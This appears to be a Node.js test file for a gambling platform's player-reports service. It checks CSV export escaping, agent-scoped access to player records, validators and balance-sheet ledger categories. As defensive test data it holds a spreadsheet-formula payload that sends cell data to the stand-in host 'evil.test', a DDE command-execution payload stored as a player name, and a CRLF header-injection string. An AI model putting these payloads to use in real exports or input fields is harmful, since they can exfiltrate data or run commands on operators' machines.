'use strict';

const test = require('node:test');
const assert = require('node:assert');

const db = require('@ibitplay/db');
const { createLogger, vipLevelFor } = require('@ibitplay/common');

const { ReportsService } = require('../reports.service');
const csv = require('../csv');
const v = require('../reports.validators');

/**
 * Player reports.
 *
 * Two things this file exists to prove:
 *
 *   1. a player's own name cannot put a formula in the operator's spreadsheet.
 *      Legacy escaped quotes and nothing else.
 *   2. an agent cannot read a player outside their tree by typing an id.
 *      `/reports/*` had no authentication at all, and the balance sheet's route
 *      file argued a hierarchy check was unnecessary.
 */

const TEST_DB = process.env.TEST_DB_NAME || 'ibitplay_test';

let connection;

let nextId = 700_000_000 + (process.pid % 100_000) * 1000;
const newId = () => (nextId += 1);

test('the CSV export cannot be made to carry a formula', async (t) => {
  await t.test('a name starting with = is neutralised', () => {
    /**
     * The legacy line, in full:
     *
     *     `"${user.name?.replace(/"/g, '""') || ''}"`
     *
     * Correct CSV quoting. Excel still evaluates `"=1+1"` as a formula — the
     * quotes are the CSV layer, not the spreadsheet layer.
     */
    const attack = `=HYPERLINK("https://evil.test/?d="&A1&B1,"Click")`;
    const out = csv.cell(attack);

    assert.ok(out.startsWith(`"'=`), 'the cell no longer STARTS with =');
    assert.ok(out.includes('evil.test'), 'and the text is preserved, not silently dropped');
  });

  await t.test('every formula prefix is covered, including the forgotten two', () => {
    // `-` and `@` are the ones people miss: Excel reads `-2+3` as a formula and
    // `@SUM(A1)` as a legacy Lotus one.
    for (const prefix of ['=', '+', '-', '@']) {
      assert.ok(csv.cell(`${prefix}SUM(A1)`).startsWith(`"'${prefix}`), `${prefix} is prefixed`);
    }
  });

  await t.test('the DDE command-execution variant is neutralised', () => {
    const out = csv.cell(`=cmd|'/c calc'!A1`);
    assert.ok(out.startsWith(`"'=cmd`));
  });

  await t.test('an ordinary name is untouched', () => {
    // A defence that mangles real data gets turned off.
    assert.equal(csv.cell('Priya Sharma'), '"Priya Sharma"');
    assert.equal(csv.cell('O\'Brien'), `"O'Brien"`);
    assert.equal(csv.cell(1234), '"1234"');
  });

  await t.test('a name carrying a newline cannot break the row structure', () => {
    const out = csv.cell('Priya\r\nEvil,Row');
    assert.equal(out.includes('\n'), false);
    assert.equal(out.includes('\r'), false);
  });

  await t.test('quotes are still doubled — both defences, not one', () => {
    assert.equal(csv.cell('say "hi"'), '"say ""hi"""');
  });

  await t.test('a whole document round-trips with CRLF line endings', () => {
    const doc = csv.build(['A', 'B'], [['1', '2'], ['3', '4']]);
    assert.equal(doc, '"A","B"\r\n"1","2"\r\n"3","4"\r\n');
  });

  await t.test('the download filename cannot inject a header', () => {
    const header = csv.filename('report', '2026-01-01\r\nX-Evil: yes');
    assert.equal(header.includes('\r'), false);
    assert.equal(header.includes('\n'), false);
  });
});

test('report validators', async (t) => {
  await t.test('the page size has a ceiling', () => {
    // Legacy took `limit` off the query string and ran two queries per row.
    assert.equal(v.listPlayers.query.safeParse({ limit: '100000' }).success, false);
    assert.equal(v.listPlayers.query.parse({ limit: '50' }).limit, 50);
    assert.equal(v.listPlayers.query.parse({}).limit, 25);
  });

  await t.test('a currency must be one this platform actually holds', () => {
    assert.equal(v.balanceSheet.query.safeParse({ currency: 'INR' }).success, true);
    assert.equal(v.balanceSheet.query.safeParse({ currency: 'GBP' }).success, false);
    // `USD` was in legacy's whitelist with no `credits.usd` column behind it.
    assert.equal(v.balanceSheet.query.safeParse({ currency: 'USD' }).success, true);
  });

  await t.test('a player id must be a positive integer', () => {
    assert.equal(v.playerReport.params.safeParse({ userId: 'abc' }).success, false);
    assert.equal(v.playerReport.params.safeParse({ userId: '-1' }).success, false);
    assert.equal(v.playerReport.params.parse({ userId: '42' }).userId, 42);
  });
});

test('reports against a database', async (t) => {
  const logger = createLogger({ name: 'reports-test', level: 'silent' });

  try {
    connection = await db.connect({
      config: {
        DB_HOST: process.env.DB_HOST || '127.0.0.1',
        DB_PORT: Number(process.env.DB_PORT || 5432),
        DB_NAME: TEST_DB,
        DB_USER: process.env.DB_USER || 'postgres',
        DB_PASSWORD: process.env.DB_PASSWORD || 'postgres',
        DB_SCHEMA: 'public',
      },
      logger,
      service: 'admin-service',
    });
    await connection.ping();
  } catch (error) {
    t.skip(`No test database reachable (${error.message})`);
    return;
  }

  const { models } = connection;
  const service = new ReportsService({ models, db: connection, logger, config: {} });

  /**
   * Two agents with no relationship to each other, each with one player.
   * `agentA` must not be able to read `playerB` by any route here.
   */
  // An AGENT's role, not the first one in the table: the Super Admin sees
  // every player on the site, so rivals modelled with it would not be rivals.
  const roleId = (await models.Roles.findOne({ where: { level: 6 }, raw: true }))?.id;
  assert.ok(roleId, 'the test database needs a level-6 (agent) role');

  // The platform owner: since the Addaplay rule only the Super Admin reads
  // every tree (an Admin is scoped to its own subtree). A restored legacy
  // owner role may carry level 0.
  const houseRoleId = (await models.Roles.findOne({ where: { level: [0, 1] }, order: [['level', 'ASC']], raw: true }))?.id;
  assert.ok(houseRoleId, 'the test database needs a super-admin role');

  const agentA = newId();
  const agentB = newId();
  const houseId = newId();
  const playerA = newId();
  const playerB = newId();

  t.before(async () => {
    for (const id of [playerA, playerB]) {
      await models.Credits.destroy({ where: { uid: id } });
      await models.Users.destroy({ where: { id } });
    }
    await models.Staff.destroy({ where: { id: [agentA, agentB, houseId] } });

    await models.Staff.bulkCreate([
      { id: houseId, name: `house-${houseId}`, email: `h${houseId}@t.test`, password: 'x', role_id: houseRoleId, parent_id: null },
      { id: agentA, name: `agent-a-${agentA}`, email: `a${agentA}@t.test`, password: 'x', role_id: roleId, parent_id: null },
      { id: agentB, name: `agent-b-${agentB}`, email: `b${agentB}@t.test`, password: 'x', role_id: roleId, parent_id: null },
    ]);

    await models.Users.bulkCreate([
      { id: playerA, name: 'Player A', password: 'x', status: 'active', parent_staff_id: agentA },
      {
        id: playerB,
        // The attack, stored as a player's own registered name.
        name: `=cmd|'/c calc'!A1`,
        password: 'x',
        status: 'active',
        parent_staff_id: agentB,
      },
    ]);

    await models.Credits.bulkCreate([
      { uid: playerA, inr: '1500.50' },
      { uid: playerB, inr: '9999' },
    ]);
  });

  /**
   * One teardown, and it closes the connection LAST.
   *
   * `node:test` runs `after` hooks in registration order, so a hook that closes
   * the pool registered before one that deletes rows takes the connection out
   * from under the cleanup.
   */
  t.after(async () => {
    for (const id of [playerA, playerB]) {
      await models.Userwager.destroy({ where: { uid: id } });
      await models.Credits.destroy({ where: { uid: id } });
      await models.Users.destroy({ where: { id } });
    }
    await models.Staff.destroy({ where: { id: [agentA, agentB, houseId] } });
    if (connection) await connection.close();
  });

  const asA = { id: agentA, permissions: ['*'] };
  const asB = { id: agentB, permissions: ['*'] };
  // The level decides the house-only fields (VIP); the tree decides the rows.
  const agentA6 = { id: agentA, level: 6, permissions: ['*'] };
  const house = { id: houseId, level: 1, permissions: ['*'] };

  await t.test('an agent sees their own player', async () => {
    const report = await service.playerReport({ staff: asA, userId: playerA });
    assert.equal(report.id, String(playerA));
    assert.equal(report.balance, '1500.50000000');
  });

  await t.test("an agent CANNOT read a rival's player by typing the id", async () => {
    /**
     * The route file for the balance sheet argued this was unnecessary:
     *
     *     // The user-listing endpoints are already scoped per-staff, so each
     *     // staff only ever has IDs for users within their own downline.
     *
     * Ids are sequential integers.
     */
    await assert.rejects(
      () => service.playerReport({ staff: asA, userId: playerB }),
      (err) => err.code === 'REPORTS_PLAYER_NOT_FOUND' && err.status === 404
    );

    await assert.rejects(
      () => service.balanceSheet({ staff: asA, userId: playerB }),
      (err) => err.code === 'REPORTS_PLAYER_NOT_FOUND'
    );
  });

  await t.test('a nonexistent player and a rival\'s player answer identically', async () => {
    // Two distinguishable answers turn the endpoint into an oracle for which
    // ids exist. Legacy answered 403 for one and 404 for the other.
    const rival = await service.playerReport({ staff: asA, userId: playerB }).catch((e) => e);
    const absent = await service.playerReport({ staff: asA, userId: 999_999_999 }).catch((e) => e);

    assert.equal(rival.code, absent.code);
    assert.equal(rival.status, absent.status);
    assert.equal(rival.message, absent.message);
  });

  await t.test('the listing is scoped to the caller', async () => {
    const seenByA = await service.listPlayers({ staff: asA, limit: 100 });
    const ids = seenByA.rows.map((r) => r.id);

    assert.ok(ids.includes(String(playerA)));
    assert.equal(ids.includes(String(playerB)), false);

    // Users page: har row me locks aur parent staff; summary bhi usi scope me.
    const rowA = (await service.userList({ staff: asA, limit: 100 })).rows.find((r) => r.id === String(playerA));
    assert.equal(typeof rowA.locks.withdraw, 'boolean');
    assert.ok(rowA.parentStaff, 'agent player has a parent staff');
    const list = await service.userList({ staff: asA, channel: 'agent', limit: 100 });
    const summary = await service.playersSummary({ staff: asA, channel: 'agent' });
    assert.equal(summary.totalUsers, list.total);
    assert.equal(seenByA.rows[0].locks, undefined, 'players API unchanged');

    // Client user (parent hai) ki balance sheet point ledger se aati hai; points credits ke columns se.
    await models.Credits.findOrCreate({ where: { uid: playerA }, defaults: { uid: playerA, inr: '0' } });
    await models.Credits.sequelize.query(
      'UPDATE credits SET sports_pts = 12, thirdparty_pts = 34, original_game_pts = -5.5 WHERE uid = :uid',
      { replacements: { uid: playerA } }
    );
    const sheet = await service.clientBalanceSheet({ staff: asA, userId: playerA, limit: 10, offset: 0 });
    assert.equal(sheet.source, 'point_ledger');
    assert.equal(Number(sheet.points.sports), 12);
    assert.equal(Number(sheet.points.casino), 34);
    assert.equal(Number(sheet.points.original), -5.5);
    assert.ok(Array.isArray(sheet.rows));
  });

  await t.test('THE EXPORT IS SCOPED, AND THE HOSTILE NAME IS NEUTRALISED', async () => {
    const exported = await service.exportPlayers({ staff: asB });

    assert.ok(exported.csv.includes(String(playerB)));
    // Present as text...
    assert.ok(exported.csv.includes(`'=cmd|'/c calc'!A1`), 'the name is prefixed, not dropped');
    // ...and never at the start of a cell.
    assert.equal(exported.csv.includes(`,"=cmd`), false);
    assert.equal(exported.csv.startsWith('"=cmd'), false);

    // And agent B's export does not contain agent A's player.
    assert.equal(exported.csv.includes(String(playerA)), false);
  });

  await t.test('VIP standing is house-only: list, detail and export', async () => {
    await models.Userwager.destroy({ where: { uid: playerA } });
    await models.Userwager.create({ uid: playerA, wager: '5500' });

    const listed = (await service.listPlayers({ staff: agentA6, limit: 100 })).rows.find((r) => r.id === String(playerA));
    const detail = await service.playerReport({ staff: agentA6, userId: playerA });
    const exported = await service.exportPlayers({ staff: agentA6 });
    assert.equal(listed.vip, null, 'the list sends no VIP tier to the agent tree');
    assert.equal(detail.vip, null, 'nor does the detail');
    assert.equal(exported.csv.includes('VIP Level'), false, 'the agent export has no VIP columns');
    assert.equal(exported.csv.includes('Card Type'), false);
    assert.ok(exported.csv.includes(String(playerA)));

    const houseListed = (await service.listPlayers({ staff: house, search: String(playerA), limit: 10 })).rows.find((r) => r.id === String(playerA));
    const houseDetail = await service.playerReport({ staff: house, userId: playerA });
    const houseExport = await service.exportPlayers({ staff: house, search: String(playerA) });
    assert.equal(houseListed.vip.name, 'Bronze II');
    assert.equal(houseDetail.vip.level, 2);
    assert.ok(houseExport.csv.includes('VIP Level') && houseExport.csv.includes('Card Type'), 'house staff keep the VIP columns');

    await models.Userwager.destroy({ where: { uid: playerA } });
  });

  await t.test('games played is the ledger bet count, not the stale users column', async () => {
    await models.Users.update({ games_played: 0 }, { where: { id: playerA } });
    await models.CreditsLedger.bulkCreate([
      { user_id: String(playerA), currency: 'INR', amount: '-5', netamount: '-5', reason: 'BET_STAKE', source_service: 'casino-service' },
      { user_id: String(playerA), currency: 'INR', amount: '-5', netamount: '-5', reason: 'BET_STAKE', source_service: 'casino-service' },
      { user_id: String(playerA), currency: 'INR', amount: '7', netamount: '7', reason: 'BET_PAYOUT', source_service: 'casino-service' },
    ]);
    try {
      const detail = await service.playerReport({ staff: asA, userId: playerA });
      assert.equal(detail.gamesPlayed, 2);
    } finally {
      await models.CreditsLedger.destroy({ where: { user_id: String(playerA) } });
    }
  });

  await t.test('the balance sheet reports the live wallet exactly', async () => {
    const sheet = await service.balanceSheet({ staff: asA, userId: playerA });
    assert.equal(sheet.balance.live, '1500.50000000');
    assert.equal(sheet.currency, 'INR');
  });

  await t.test('casino bet rows are Casino / Original Games with their amount, not empty Sports lines', async () => {
    const ledger = (reason, amount, refType, extra = {}) => ({
      user_id: String(playerA), currency: 'INR', amount, netamount: 0, reason, source_service: 'casino-service', meta: { refType }, ...extra,
    });
    await models.CreditsLedger.bulkCreate([
      ledger('BET_STAKE', '-1000', 'OG', { description: 'original-games bet t5-sheet-tx', meta: { refType: 'OG', refId: 't5-sheet-tx' } }),
      ledger('BET_PAYOUT', '1000', 'OG'),
      ledger('BET_STAKE', '-20', 'JSGAMES'),
      // GIS rounds are read from gis_transactions; the ledger copy must not double them.
      ledger('BET_STAKE', '-5', 'GIS'),
      // A sports settlement keeps its netamount and its category.
      { user_id: String(playerA), currency: 'INR', amount: '0', netamount: '30', reason: 'BET_PAYOUT', source_service: 'sports-service' },
    ]);
    const q = (sql) => models.CreditsLedger.sequelize.query(sql);
    await q(`INSERT INTO og_games (code, name, position, data, synced_at) VALUES ('t5sheet', 'Sheet Test Game', 999, '{}', now()) ON CONFLICT (code) DO NOTHING`);
    await q(`INSERT INTO og_transactions (transaction_id, kind, status, user_id, game_code, currency, amount, created_at)
             VALUES ('t5-sheet-tx', 'bet', 'applied', ${Number(playerA)}, 't5sheet', 'INR', 1000, now())`);
    try {
      const sheet = await service.balanceSheet({ staff: asA, userId: playerA, limit: 500 });
      const by = (c) => sheet.rows.filter((r) => r.category === c).map((r) => r.amount).sort();
      assert.deepEqual(by('Original Games'), ['-1000.00000000', '1000.00000000']);
      const stake = sheet.rows.find((r) => r.category === 'Original Games' && r.amount === '-1000.00000000');
      assert.equal(stake.description, 'Sheet Test Game bet', 'the game is named, and the transaction id is not shown');
      assert.deepEqual(by('Casino'), ['-20.00000000']);
      assert.deepEqual(by('Sports'), ['30.00000000']);
      assert.equal(sheet.balance.debited, '-1020.00000000');
      assert.equal(sheet.balance.credited, '1030.00000000');
    } finally {
      await models.CreditsLedger.destroy({ where: { user_id: String(playerA) } });
      await q(`DELETE FROM og_transactions WHERE transaction_id = 't5-sheet-tx'`);
      await q(`DELETE FROM og_games WHERE code = 't5sheet'`);
    }
  });

  await t.test('a swap is on the sheet, one leg per currency, with its sign', async () => {
    const leg = (currency, amount, reason) => ({
      user_id: String(playerA), currency, amount, netamount: 0, reason, source_service: 'user-service',
      description: 'Swap USDT -> INR', meta: { swap: true },
    });
    await models.CreditsLedger.bulkCreate([leg('USDT', '-30', 'TRANSFER_OUT'), leg('INR', '2475', 'TRANSFER_IN')]);
    try {
      const usdt = await service.balanceSheet({ staff: asA, userId: playerA, currency: 'USDT' });
      const inr = await service.balanceSheet({ staff: asA, userId: playerA, currency: 'INR', limit: 500 });
      assert.deepEqual(usdt.rows.filter((r) => r.category === 'Swap').map((r) => [r.type, r.amount]), [['DEBIT', '-30.00000000']]);
      assert.deepEqual(inr.rows.filter((r) => r.category === 'Swap').map((r) => [r.type, r.amount]), [['CREDIT', '2475.00000000']]);
    } finally {
      await models.CreditsLedger.destroy({ where: { user_id: String(playerA) } });
    }
  });

  await t.test('vault deposits and withdrawals are on the sheet as Vault, with their sign', async () => {
    const move = (amount, reason, description) => ({
      user_id: String(playerA), currency: 'INR', amount, netamount: 0, reason, source_service: 'user-service',
      description, meta: { refType: 'VAULT', refId: '7d' },
    });
    await models.CreditsLedger.bulkCreate([move('-100', 'TRANSFER_OUT', 'Vault deposit — 7 Days'), move('100.5', 'TRANSFER_IN', 'Vault withdraw')]);
    try {
      const sheet = await service.balanceSheet({ staff: asA, userId: playerA, currency: 'INR', limit: 500 });
      const rows = sheet.rows.filter((r) => r.category === 'Vault').map((r) => [r.type, r.amount, r.description]).sort();
      assert.deepEqual(rows, [['CREDIT', '100.50000000', 'Vault withdraw'], ['DEBIT', '-100.00000000', 'Vault deposit — 7 Days']]);
    } finally {
      await models.CreditsLedger.destroy({ where: { user_id: String(playerA) } });
    }
  });

  await t.test('race-prize and rakeback claims are on the sheet, not unexplained', async () => {
    const claim = (reason, amount) => ({
      user_id: String(playerA), currency: 'USDT', amount, netamount: 0, reason, source_service: 'user-service', description: reason,
    });
    await models.CreditsLedger.bulkCreate([claim('race_reward_claim', '0.0105556'), claim('rakeback_claim', '0.25')]);
    try {
      const sheet = await service.balanceSheet({ staff: asA, userId: playerA, currency: 'USDT' });
      const rows = sheet.rows.filter((r) => r.category === 'Race' || r.category === 'Rakeback').map((r) => [r.category, r.type, r.amount]).sort();
      assert.deepEqual(rows, [['Race', 'CREDIT', '0.01055560'], ['Rakeback', 'CREDIT', '0.25000000']]);
    } finally {
      await models.CreditsLedger.destroy({ where: { user_id: String(playerA) } });
    }
  });

  await t.test("sports rows are each bet's P/L from the point ledger: point_ledger (agent user), point_ledger_direct (direct user)", async () => {
    const q = (sql, replacements) => models.Users.sequelize.query(sql, { replacements, type: 'SELECT' });
    const directP = newId();
    await models.Users.create({ id: directP, name: 'Direct P', password: 'x', status: 'active' });
    const ids = [playerA, playerB, directP];
    // sports service ka mirror (SportsBet.user_id ki FK isi par hai)
    await q(`INSERT INTO mssports.users (user_id, username, password, role_id, "createdAt", "updatedAt")
             SELECT id, 'sheet-' || id, 'x', 1, now(), now() FROM unnest(ARRAY[:ids]::bigint[]) id ON CONFLICT DO NOTHING`, { ids });
    const bet = async (uid) =>
      (await q(`INSERT INTO mssports."SportsBet" (user_id, game_type, bet_type, odds, stake_amount) VALUES (:uid, 'MO', 'back', 2, 100) RETURNING id`, { uid }))[0].id;
    const betA = await bet(playerA);
    const betB = await bet(playerB);
    const betD = await bet(directP);
    const [{ id: walletA }] = await q('SELECT id FROM public.credits WHERE uid = :uid', { uid: playerA });
    await q(`INSERT INTO mssports.point_ledger (entry_ref, event_type, category, wallet_id, delta, bet_id, remark, created_at) VALUES
      ('t-sheet-a1', 'BET_SETTLEMENT', 'SPORTS', :walletA, -550, :betA, 'fancy lost', now()),
      ('t-sheet-a2', 'VOID', 'SPORTS', :walletA, 0, :betA, 'void', now()),
      ('t-sheet-a3', 'BET_SETTLEMENT', 'CASINO', :walletA, 7, :betA, 'casino', now()),
      ('t-sheet-a4', 'BET_SETTLEMENT', 'SPORTS', :walletA, 9, :betB, 'not her bet', now())`, { walletA, betA, betB });
    await q(`INSERT INTO mssports.point_ledger_direct (entry_ref, source, event_type, category, user_id, currency, delta, bet_id, remark) VALUES
      ('t-sheet-d1', NULL, 'BET_SETTLEMENT', 'SPORTS', :directP, 'INR', 40, :betD, 'match won'),
      ('t-sheet-d2', 'sports-service', 'BET_PLACED', 'OTHER', :directP, 'INR', -100, :betD, 'stake hold')`, { directP, betD });
    await q(`INSERT INTO mssports.total_exposures (user_id, total_exposure, "createdAt", "updatedAt") VALUES (:directP, -100, now(), now())`, { directP });
    try {
      const sports = (sheet) => sheet.rows.filter((r) => r.category === 'Sports').map((r) => [r.type, r.amount, r.description]);
      const agentSheet = await service.balanceSheet({ staff: asA, userId: playerA, limit: 500 });
      assert.deepEqual(sports(agentSheet), [['DEBIT', '-550.00000000', 'fancy lost']]);
      // Direct users are seen by staff 1, the platform owner.
      const directSheet = await service.balanceSheet({ staff: { id: 1, level: 1, permissions: ['*'] }, userId: directP, limit: 500 });
      assert.deepEqual(sports(directSheet), [['CREDIT', '40.00000000', 'match won']]);
      // The stake an open bet holds is not a row; unexplained adds it back: live 0 + held 100 − ledger 40.
      assert.equal(directSheet.balance.openExposure, '100.00000000');
      assert.equal(directSheet.balance.unexplained, '60.00000000');
    } finally {
      await q(`DELETE FROM mssports.point_ledger WHERE entry_ref LIKE 't-sheet-%'`);
      await q(`DELETE FROM mssports.point_ledger_direct WHERE entry_ref LIKE 't-sheet-%'`);
      await q('DELETE FROM mssports.total_exposures WHERE user_id = :directP', { directP });
      await q('DELETE FROM mssports."SportsBet" WHERE id IN (:bets)', { bets: [betA, betB, betD] });
      await q('DELETE FROM mssports.users WHERE user_id IN (:ids)', { ids });
      await models.Users.destroy({ where: { id: directP } });
    }
  });

  await t.test('the balance sheet page reaches past 200 rows', () => {
    assert.equal(v.balanceSheet.query.parse({ limit: '1000' }).limit, 1000);
  });

  await t.test('`USD` resolves to the wallet that exists', async () => {
    /**
     * Legacy's `ALLOWED_CURRENCIES` contained 'USD' and there is no
     * `credits.usd` column, so it passed the whitelist and then built
     * `COALESCE(c.usd, 0)` — a 500 on a currency its own check said was fine.
     */
    const sheet = await service.balanceSheet({ staff: asA, userId: playerA, currency: 'USD' });
    assert.equal(sheet.currency, 'USDT');
  });

  await t.test('an unsupported currency is a 400, not a 500', async () => {
    await assert.rejects(
      () => service.balanceSheet({ staff: asA, userId: playerA, currency: 'GBP' }),
      (err) => err.code === 'REPORTS_UNSUPPORTED_CURRENCY' && err.status === 400
    );
  });

  await t.test('the VIP level shown is the one the player HOLDS', async () => {
    /**
     * Legacy returned `vipLevel: nextVip.level` — the level NOT yet reached —
     * and put the real one in `previousVipLevel`. Every report showed every
     * player one tier high.
     */
    await models.Userwager.destroy({ where: { uid: playerA } });
    await models.Userwager.create({ uid: playerA, wager: '5,500' });

    const report = await service.playerReport({ staff: house, userId: playerA });
    const expected = vipLevelFor('5500');

    assert.equal(report.vip.level, expected.level);
    assert.equal(report.vip.level, 2, 'wager 5,500 sits in the 3,000–6,999 band (hash.game ladder)');
    assert.equal(report.vip.name, 'Bronze II');
    assert.equal(report.vip.nextLevel, 3, 'and the NEXT level is named as such');
    assert.equal(report.vip.nextName, 'Bronze III');
  });

  await t.test('a wager string with thousands separators is parsed, not truncated', async () => {
    await models.Userwager.destroy({ where: { uid: playerA } });
    await models.Userwager.create({ uid: playerA, wager: '1,234,567' });

    const report = await service.playerReport({ staff: house, userId: playerA });
    assert.equal(report.wager, '1234567.00000000');
    // 1,234,567 is Gold II, whose band begins at 1,000,000. Asserted through
    // the ladder as well as by name, so a future band change fails here loudly
    // rather than quietly reporting the wrong rank to an operator.
    assert.equal(report.vip.level, vipLevelFor('1234567').level);
    assert.equal(report.vip.name, 'Gold II');

    await models.Userwager.destroy({ where: { uid: playerA } });
  });

  await t.test('the search box does not treat _ as a wildcard', async () => {
    // `%` and `_` are LIKE wildcards. Legacy passed the term straight through,
    // so a search for `_` matched every player.
    const wildcard = await service.listPlayers({ staff: asA, search: '_', limit: 100 });
    assert.equal(wildcard.total, 0, 'an underscore matches a literal underscore');
  });

  // ── The agent system ─────────────────────────────────────────────────

});
